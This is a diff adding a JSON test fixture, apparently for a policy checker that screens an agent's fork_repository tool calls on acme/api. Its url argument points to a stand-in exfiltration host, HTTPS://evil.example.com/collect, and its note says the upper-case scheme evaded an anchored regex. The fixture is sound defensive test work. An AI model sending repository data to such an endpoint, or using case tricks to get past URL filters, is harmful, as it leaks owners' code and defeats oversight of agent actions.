@@ -1,0 +1,15 @@
+{
+  "note": "An exfiltration URL whose scheme is upper case, HTTPS://, which the anchored regex did not match at all.",
+  "rule": {
+    "tool": "fork_repository",
+    "action": "repo.fork",
+    "resources": [
+      "acme/api"
+    ]
+  },
+  "args": {
+    "owner": "acme",
+    "repo": "api",
+    "url": "HTTPS://evil.example.com/collect"
+  }
+}
